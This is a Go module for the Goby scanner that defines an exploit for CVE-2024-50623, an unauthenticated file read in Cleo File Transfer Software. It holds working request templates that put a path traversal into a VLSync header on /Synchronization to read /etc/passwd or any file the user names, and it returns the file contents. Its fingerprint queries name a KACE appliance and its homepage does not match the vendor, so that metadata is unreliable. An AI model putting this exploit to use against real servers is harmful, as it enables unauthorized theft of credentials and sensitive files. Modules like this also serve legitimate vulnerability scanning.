package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Cleo File Transfer Software /Synchronization File Read Vulnerability (CVE-2024-50623)",
    "Description": "<p>Cleo is a company providing enterprise-level data transfer and integration solutions, widely used in supply chain, finance, and customer relationship fields. The /Synchronization interface of Cleo File Transfer Software has an arbitrary file read vulnerability, allowing attackers to construct specific requests to access arbitrary files on the server without authorization, potentially leading to sensitive information disclosure, data tampering, and other serious security issues.</p>",
    "Product": "Cleo File Transfer Software",
    "Homepage": "https://cleoconference.org/",
    "DisclosureDate": "2024-10-27",
    "PostTime": "2024-12-17",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"packages/partnerlogos/userportal_logo\" && title=\"KACE Systems Management Appliance Service Center\"",
    "GobyQuery": "body=\"packages/partnerlogos/userportal_logo\" && title=\"KACE Systems Management Appliance Service Center\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to access arbitrary files on the server without authorization, potentially leading to sensitive information disclosure, data tampering, and other serious security issues, such as further privilege escalation or attack chain extension.</p>",
    "Recommendation": "<p>It is recommended to update Cleo file transfer software to the latest version immediately and ensure all security patches are applied. Additionally, restrict access to sensitive files and use security measures such as WAF (Web Application Firewall) to prevent malicious requests.</p>",
    "References": [
        "https://blog.csdn.net/2303_77176437/article/details/144429313",
        "https://cve.mitre.org/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "/etc/passwd",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Synchronization",
                "follow_redirect": true,
                "header": {
                    "VLSync": "Retrieve;l=Ab1234-RQ0258;n=VLTrader;v=7.2.1;a=1337;po=1337;s=True;b=False;pp=1337;path=../../etc/passwd"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/Synchronization",
                "follow_redirect": true,
                "header": {
                    "VLSync": "Retrieve;l=Ab1234-RQ0258;n=VLTrader;v=7.2.1;a=1337;po=1337;s=True;b=False;pp=1337;path=../../{{{filePath}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:x",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2024-50623"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "Cleo文件传输软件 /Synchronization 文件读取漏洞（CVE-2024-50623）",
            "Product": "Cleo文件传输软件",
            "Description": "<p>Cleo是一家提供企业级数据传输和集成解决方案的公司，其产品被广泛应用于供应链、财务和客户关系等领域。Cleo文件传输软件的 /Synchronization 接口存在任意文件读取漏洞，攻击者可以通过构造特定请求，未经授权地访问服务器上的任意文件，可能导致敏感信息泄露、数据篡改，甚至引发其他严重的安全问题。</p>",
            "Recommendation": "<p>建议立即更新Cleo文件传输软件至最新版本，并确保所有安全补丁已应用。同时，限制对敏感文件的访问权限，采用WAF（Web应用防火墙）等安全措施，防止恶意请求的执行。</p>",
            "Impact": "<p>该漏洞允许攻击者未经授权访问服务器上的任意文件，可能导致敏感信息泄露、数据篡改，甚至引发其他严重的安全问题，如进一步的权限提升或攻击链扩展。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Cleo File Transfer Software /Synchronization File Read Vulnerability (CVE-2024-50623)",
            "Product": "Cleo File Transfer Software",
            "Description": "<p>Cleo is a company providing enterprise-level data transfer and integration solutions, widely used in supply chain, finance, and customer relationship fields. The /Synchronization interface of Cleo File Transfer Software has an arbitrary file read vulnerability, allowing attackers to construct specific requests to access arbitrary files on the server without authorization, potentially leading to sensitive information disclosure, data tampering, and other serious security issues.</p>",
            "Recommendation": "<p>It is recommended to update Cleo file transfer software to the latest version immediately and ensure all security patches are applied. Additionally, restrict access to sensitive files and use security measures such as WAF (Web Application Firewall) to prevent malicious requests.</p>",
            "Impact": "<p>This vulnerability allows attackers to access arbitrary files on the server without authorization, potentially leading to sensitive information disclosure, data tampering, and other serious security issues, such as further privilege escalation or attack chain extension.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/Synchronization"
    },
    "VariablesOrder": [
        "filePath",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9978"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}